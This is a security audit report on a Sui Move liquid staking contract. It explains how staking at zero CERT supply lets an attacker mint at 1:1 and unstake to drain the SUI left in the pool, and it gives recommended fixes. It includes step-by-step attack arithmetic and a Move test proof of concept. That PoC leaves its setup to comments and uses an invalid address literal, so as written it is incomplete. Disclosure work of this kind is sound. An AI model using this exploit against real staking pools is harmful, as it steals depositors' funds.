# Audit Report

## Title
First Mint After Zero Supply Allows Theft of Remaining Pool SUI

## Summary
A critical vulnerability exists in the liquid staking pool's ratio calculation and invariant checking that allows an attacker to steal all remaining SUI when CERT supply reaches zero but SUI remains in the pool. The special case handling for zero supply enables minting CERT at a 1:1 ratio regardless of existing SUI balance, which can be immediately unstaked at a favorable ratio to extract all pool funds.

## Finding Description

The vulnerability stems from the interaction between three key mechanisms in `stake_pool.move`:

**1. Zero Supply Ratio Calculation**

The `sui_amount_to_lst_amount()` function returns a 1:1 ratio when either supply is zero: [1](#0-0) 

**2. Special Case Invariant Allowance**

The `stake()` function includes an explicit special case that bypasses the ratio invariant check when `old_sui_supply > 0 && old_lst_supply == 0`: [2](#0-1) 

This special case was likely intended for initial pool creation but creates an exploitable path when the pool returns to zero CERT supply.

**3. Proportional Unstaking**

The `lst_amount_to_sui_amount()` function calculates unstake amounts proportionally: [3](#0-2) 

**How SUI Remains When CERT Supply Is Zero**

The `total_sui_supply()` calculation excludes accrued reward fees: [4](#0-3) 

SUI can remain in the pool through several mechanisms:
- Boosted rewards added via `join_to_sui_pool()` during epoch rollovers [5](#0-4) 
- Redistribution fees from non-final unstakes that go back to the pool [6](#0-5) 
- Rounding errors in validator unstaking operations

**Attack Execution**

When `total_lst_supply = 0` but `total_sui_supply() = X > 0`:

1. Attacker stakes 1 SUI (0.99 SUI after 1% fee)
2. Receives 0.99 CERT (1:1 ratio due to line 636-637)
3. New state: `total_sui_supply() = X + 0.99`, `total_lst_supply = 0.99`
4. Attacker unstakes 0.99 CERT
5. Receives: `(X + 0.99) * 0.99 / 0.99 = X + 0.99` SUI (before fees)
6. After 1% unstake fee: `(X + 0.99) * 0.99 ≈ 0.98X + 0.98` SUI
7. **Profit: `0.98X - 0.02` SUI** (stole most of the remaining pool)

The invariant check at unstake passes because the attacker owns all CERT and receives proportional SUI: [7](#0-6) 

## Impact Explanation

**CRITICAL - Direct Fund Theft**

- **Complete theft** of all effective SUI supply in the pool (minus fees)
- Affects **legitimate users** who have unclaimed rewards or fees
- **Repeatable** - can be executed multiple times if pool returns to zero supply state
- **No victim interaction required** - attacker can front-run or wait for natural zero supply state

The attack is economically rational with extremely high ROI:
- Cost: ~1 SUI + 2% fees
- Profit: All remaining SUI (potentially thousands from accumulated rewards)
- ROI: Can exceed 100x for pools with significant accumulated rewards

## Likelihood Explanation

**HIGH - Practically Exploitable**

**Entry Point Accessibility**: Both `stake()` and `unstake()` are public entry functions: [8](#0-7) 

**Feasible Preconditions**:
- Zero CERT supply occurs **naturally** when the last user unstakes
- SUI remains from boosted rewards added during epoch rollovers
- No special permissions required
- Minimum stake amount is only 0.1 SUI [9](#0-8) 

**Attack Simplicity**:
- Only two transactions required: `stake_entry()` then `unstake_entry()`
- No race conditions or complex timing
- All invariant checks pass due to the explicit special case
- Works within normal Sui Move execution model

**Real-World Feasibility**:
- Attacker can monitor on-chain state for zero supply condition
- Can front-run the next staker after zero supply is reached
- Pool continues accepting stakes even at zero supply (no guards prevent this)

## Recommendation

**Fix the special case logic to distinguish between initial creation and zero-supply-after-activity states:**

```move
// Option 1: Track if pool has ever been used
public struct StakePool has key, store {
    id: UID,
    fee_config: FeeConfig,
    fees: Balance<SUI>,
    boosted_balance: Balance<SUI>,
    boosted_reward_amount: u64,
    accrued_reward_fees: u64,
    validator_pool: ValidatorPool,
    manage: Manage,
    has_been_used: bool,  // NEW: Track if pool ever had CERT minted
    extra_fields: Bag
}

// In stake() function, modify the invariant:
assert!(
    ((lst.value() as u128) * old_sui_supply <= (sui_balance.value() as u128) * old_lst_supply)
    || (old_sui_supply > 0 && old_lst_supply == 0 && !self.has_been_used), // Only allow for fresh pools
    ERatio
);

// Set has_been_used = true after first successful mint
if (!self.has_been_used && lst.value() > 0) {
    self.has_been_used = true;
};
```

**Option 2: Prevent staking when CERT supply is zero but SUI remains:**

```move
// In stake() function, add check before minting:
let old_sui_supply = self.total_sui_supply();
let old_lst_supply = total_lst_supply(metadata);

// Prevent exploitation of zero supply state after pool has been used
assert!(
    !(old_sui_supply > 0 && old_lst_supply == 0),
    ECannotStakeAfterZeroSupply  // New error code
);
```

**Option 3: Ensure all SUI is distributed before reaching zero supply:**

Modify unstaking logic to force collection of all fees and distribute all remaining SUI to the last unstaker proportionally.

## Proof of Concept

```move
#[test_only]
module liquid_staking::exploit_test {
    use sui::test_scenario::{Self as ts, Scenario};
    use sui::coin::{Self, Coin};
    use sui::sui::SUI;
    use liquid_staking::stake_pool::{Self, StakePool};
    use liquid_staking::cert::{Self, Metadata, CERT};
    use sui_system::sui_system::{Self, SuiSystemState};
    
    #[test]
    fun test_zero_supply_theft() {
        let mut scenario = ts::begin(@0xABCD);
        let ctx = scenario.ctx();
        
        // Setup: Create pool with some initial state
        // Then simulate scenario where:
        // - All CERT is burned (total_lst_supply = 0)
        // - But 100 SUI remains in pool (from boosted rewards)
        
        scenario.next_tx(@0xATTACKER);
        {
            let mut pool = scenario.take_shared<StakePool>();
            let mut metadata = scenario.take_shared<Metadata<CERT>>();
            let mut system_state = scenario.take_shared<SuiSystemState>();
            
            // Verify pre-conditions
            assert!(cert::get_total_supply_value(&metadata) == 0, 0); // Zero CERT
            assert!(stake_pool::total_sui_supply(&pool) == 100_000_000_000, 1); // 100 SUI remains
            
            // Attack Step 1: Stake 1 SUI
            let stake_coin = coin::mint_for_testing<SUI>(1_000_000_000, ctx); // 1 SUI
            let cert = stake_pool::stake(
                &mut pool,
                &mut metadata,
                &mut system_state,
                stake_coin,
                ctx
            );
            
            let cert_amount = coin::value(&cert);
            // Should receive ~0.99 CERT (after 1% fee) at 1:1 ratio
            assert!(cert_amount >= 990_000_000 && cert_amount <= 1_000_000_000, 2);
            
            // Attack Step 2: Immediately unstake
            let sui_out = stake_pool::unstake(
                &mut pool,
                &mut metadata,
                &mut system_state,
                cert,
                ctx
            );
            
            let sui_received = coin::value(&sui_out);
            // Attacker should receive most of the 100 SUI that was in the pool
            // After fees, should receive ~98 SUI (stole 97 SUI profit)
            assert!(sui_received > 90_000_000_000, 3); // Received > 90 SUI
            
            // Profit = sui_received - initial_stake
            // Should be close to 100 SUI - 1 SUI - fees ≈ 97 SUI profit
            
            ts::return_shared(pool);
            ts::return_shared(metadata);
            ts::return_shared(system_state);
            coin::burn_for_testing(sui_out);
        };
        
        scenario.end();
    }
}
```

**Notes**

The vulnerability is confirmed through code analysis. The special case allowance at line 259 combined with the 1:1 ratio at zero supply creates a critical exploit path. While the special case was likely intended to handle initial pool creation, it fails to account for the scenario where the pool returns to zero CERT supply after being operational. The attack is straightforward, requires no special privileges, and can result in complete theft of remaining protocol SUI with minimal cost. This represents a critical threat to the protocol's solvency and user funds.

### Citations

**File:** liquid_staking/sources/stake_pool.move (L31-31)
```text
    const MIN_STAKE_AMOUNT: u64 = 1_00_000_000; // 0.1 SUI
```

**File:** liquid_staking/sources/stake_pool.move (L219-225)
```text
    public fun stake(
        self: &mut StakePool, 
        metadata: &mut Metadata<CERT>,
        system_state: &mut SuiSystemState, 
        sui: Coin<SUI>, 
        ctx: &mut TxContext
    ): Coin<CERT> {
```

**File:** liquid_staking/sources/stake_pool.move (L257-261)
```text
        assert!(
            ((lst.value() as u128) * old_sui_supply <= (sui_balance.value() as u128) * old_lst_supply)
            || (old_sui_supply > 0 && old_lst_supply == 0), // special case
            ERatio
        );
```

**File:** liquid_staking/sources/stake_pool.move (L312-312)
```text
        self.join_to_sui_pool(redistribution_fee);
```

**File:** liquid_staking/sources/stake_pool.move (L325-328)
```text
        assert!(
            (sui.value() as u128) * old_lst_supply <= (lst.value() as u128) * old_sui_supply,
            ERatio
        );
```

**File:** liquid_staking/sources/stake_pool.move (L531-533)
```text
                boosted_reward_amount = boosted_reward_amount.min(new_total_supply - old_total_supply).min(self.boosted_balance.value());
                let boosted_reward = self.boosted_balance.split(boosted_reward_amount);
                self.join_to_sui_pool(boosted_reward);
```

**File:** liquid_staking/sources/stake_pool.move (L559-561)
```text
    public fun total_sui_supply(self: &StakePool): u64 {
        self.validator_pool.total_sui_supply() - self.accrued_reward_fees
    }
```

**File:** liquid_staking/sources/stake_pool.move (L636-637)
```text
        if (total_sui_supply == 0 || total_lst_supply == 0) {
            return sui_amount
```

**File:** liquid_staking/sources/stake_pool.move (L657-659)
```text
        let sui_amount = (total_sui_supply as u128)
            * (lst_amount as u128) 
            / (total_lst_supply as u128);
```
